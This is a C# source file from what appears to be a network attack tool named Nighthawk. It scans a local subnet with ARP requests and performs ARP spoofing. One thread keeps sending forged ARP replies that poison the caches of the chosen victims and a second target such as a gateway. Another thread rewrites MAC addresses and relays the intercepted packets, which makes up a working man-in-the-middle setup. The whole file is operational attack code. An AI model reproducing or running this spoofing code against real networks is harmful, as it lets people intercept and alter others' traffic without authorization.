using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.NetworkInformation;
using System.Text;
using System.Net;
using System.Threading;
using SharpPcap;
using PacketDotNet;

namespace Nighthawk
{
    /* ARP network scan & ARP spoofing */
    public class ARPTools
    {
        // current device
        private LivePcapDevice device;

        // status
        public bool ScanStarted = false;
        private bool currentResolveHostnames = false;

        public bool SpoofingStarted = false;

        // packet queues (packet store for BG thread to work on)
        public List<ARPPacket> PacketQueue = new List<ARPPacket>();
        private List<ARPPacket> threadQueue = new List<ARPPacket>();

        public List<Packet> PacketRoutingQueue = new List<Packet>();
        private List<Packet> threadRoutingQueue = new List<Packet>();

        // spoofing data
        public List<ARPTarget> SpoofingTargets1;
        public Dictionary<string, PhysicalAddress> IPtoMACTargets1;
        public ARPTarget SpoofingTarget2;

        // worker thread
        private Thread worker;
        private Thread workerSender;
        private Thread workerRouter;

        private DeviceInfo deviceInfo;

        // ARP response event
        public event ArpResponseEventHandler OnArpResponse;

        private void Response(IPAddress ip, PhysicalAddress mac, string hostname)
        {
            if (OnArpResponse != null) OnArpResponse(ip, mac, hostname);
        }

        // ARP scan completed event
        public event ArpScanEventHandler OnArpScanComplete;

        private void ScanCompleted()
        {
            if (OnArpScanComplete != null) OnArpScanComplete();
        }

        // constructor
        public ARPTools(LivePcapDevice device)
        {
            // store our network interface
            this.device = device;
        }

        // scans network (ARP requests)
        public void ScanNetwork(DeviceInfo deviceInfo, bool resolveHostnames)
        {
            // get start/end IP
            long[] range = Network.MaskToStartEnd(deviceInfo.IP, deviceInfo.Mask);

            long startIP = range[0];
            long endIP = range[1];
            long currentIP = startIP;

            var test = Network.LongToIP(startIP);

            // start worker to listen for packets
            ScanStarted = true;

            this.deviceInfo = deviceInfo;

            worker = new Thread(new ThreadStart(Worker));
            worker.Name = "ARP scan thread";
            worker.Start();

            // loop through entire subnet, send ARP packets
            while (currentIP <= endIP)
            {
                // send packet
                device.SendPacket(GenerateARPRequest(Network.LongToIP(currentIP), deviceInfo));

                currentIP++;
            }

            currentResolveHostnames = resolveHostnames;

            // timeout - wait for responses
            Timer waitTimer = new Timer(new TimerCallback(Timer_WaitOver));
            waitTimer.Change((resolveHostnames ? 20000 : 4000), Timeout.Infinite);
        }

        // timer callback
        private void Timer_WaitOver(object o)
        {
            ScanStarted = false;

            // stop thread
            worker.Abort();

            // signal scan end, dispose timer
            ScanCompleted();
            (o as Timer).Dispose();
        }

        // start spoofing
        public void StartSpoofing(List<ARPTarget> targets1, ARPTarget target2)
        {
            // set targets
            SpoofingTargets1 = targets1;
            SpoofingTarget2 = target2;

            // set only target IPs
            IPtoMACTargets1 = new Dictionary<string, PhysicalAddress>();
            
            SpoofingTargets1.ForEach(delegate(ARPTarget t) { IPtoMACTargets1.Add(t.IP, t.PMAC); });
            
            // change status
            SpoofingStarted = true;

            // create ARP sender worker
            workerSender = new Thread(new ThreadStart(WorkerSender));
            workerSender.Name = "ARP sender thread";
            workerSender.Start();

            // create ARP router worker
            workerRouter = new Thread(new ThreadStart(WorkerRouter));
            workerRouter.Name = "Router thread";
            workerRouter.Start();
        }

        // stop spoofing
        public void StopSpoofing()
        {
            SpoofingStarted = false;

            // stop thread
            workerSender.Abort();
            workerRouter.Abort();
        }

        // create ARP request packet
        private EthernetPacket GenerateARPRequest(string destinationIP, DeviceInfo deviceInfo)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, PhysicalAddress.Parse("FFFFFFFFFFFF"),
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("FFFFFFFFFFFF"), IPAddress.Parse(destinationIP), device.Interface.MacAddress,
                                       IPAddress.Parse(deviceInfo.IP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // create ARP replay packet
        private EthernetPacket GenerateARPReply(string senderIP, string targetIP, PhysicalAddress targetMAC)
        {
            // generate ethernet part - layer 1
            var ethernetPacket = new EthernetPacket(device.Interface.MacAddress, targetMAC,
                                                    EthernetPacketType.Arp);

            // arp data - layer 2
            var arpPacket = new ARPPacket(ARPOperation.Response, targetMAC, IPAddress.Parse(targetIP), device.Interface.MacAddress,
                                       IPAddress.Parse(senderIP));

            ethernetPacket.PayloadPacket = arpPacket;

            return ethernetPacket;
        }

        // worker function that parses ARP packets
        public void Worker()
        {
            // loop
            while (ScanStarted)
            {
                // copy packets to threadQueue
                lock (PacketQueue)
                {
                    foreach (ARPPacket packet in PacketQueue)
                    {
                        threadQueue.Add(packet);
                    }

                    PacketQueue.Clear();
                }

                if (threadQueue.Count > 0)
                {
                    // loop through packets
                    foreach (ARPPacket packet in threadQueue)
                    {
                        // if ARP response and scanner still active
                        if (packet.Operation == ARPOperation.Response && ScanStarted)
                        {
                            // get IP, MAC
                            var ip = packet.SenderProtocolAddress;
                            var mac = packet.SenderHardwareAddress;
                            var hostname = String.Empty;

                            // resolve hostname
                            if (currentResolveHostnames)
                            {
                                try
                                {
                                    hostname = Dns.GetHostEntry(ip).HostName;
                                }
                                catch
                                {
                                }
                            }

                            Response(ip, mac, hostname);
                        }
                    }

                    threadQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }
        }

        // worker function that sends ARP packets
        public void WorkerSender()
        {
            // loop
            while (SpoofingStarted)
            {
                // one way...
                foreach (ARPTarget target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(target1.IP, SpoofingTarget2.IP, SpoofingTarget2.PMAC));
                }

                // ...and another
                foreach (ARPTarget target1 in SpoofingTargets1)
                {
                    device.SendPacket(GenerateARPReply(SpoofingTarget2.IP, target1.IP, target1.PMAC));
                }

                // some timeout
                Thread.Sleep(2000);
            }
        }

        // worker function for routing packets
        public void WorkerRouter()
        {
            // loop
            while (SpoofingStarted)
            {
                // copy packets to threadRoutingQueue
                lock (PacketRoutingQueue)
                {
                    foreach (Packet packet in PacketRoutingQueue)
                    {
                        threadRoutingQueue.Add(packet);
                    }

                    PacketRoutingQueue.Clear();
                }

                // check for pending packets
                if (threadRoutingQueue.Count > 0)
                {
                    // loop through packets and re-send them
                    foreach (Packet packet in threadRoutingQueue)
                    {
                        if (packet == null) continue;

                        var ip = (packet is IpPacket ? (IpPacket)packet : IpPacket.GetEncapsulated(packet));

                        var sourceIP = ip.SourceAddress.ToString();
                        var destinationIP = ip.DestinationAddress.ToString();

                        var ethernetPacket = (packet as EthernetPacket);

                        // incoming packets
                        if (IPtoMACTargets1.ContainsKey(destinationIP) && ethernetPacket.DestinationHwAddress.ToString() != IPtoMACTargets1[destinationIP].ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = device.Interface.MacAddress;
                            ethernetPacket.DestinationHwAddress = IPtoMACTargets1[destinationIP];

                            try
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }

                        // outgoing packets
                        if (IPtoMACTargets1.ContainsKey(sourceIP) && ethernetPacket.DestinationHwAddress.ToString() != SpoofingTarget2.PMAC.ToString())
                        {
                            // set real MAC
                            ethernetPacket.SourceHwAddress = device.Interface.MacAddress;
                            ethernetPacket.DestinationHwAddress = SpoofingTarget2.PMAC;

                            try
                            {
                                device.SendPacket(packet);
                            }
                            catch { }
                        }
                    }

                    threadRoutingQueue.Clear();
                }
                else
                {
                    // some timeout
                    Thread.Sleep(50);
                }
            }
        }
    }
    
    // ArpResponseReceived event delegate
    public delegate void ArpResponseEventHandler(IPAddress ip, PhysicalAddress mac, string hostname);

    // ArpScanEventHandler event delegate
    public delegate void ArpScanEventHandler();
}
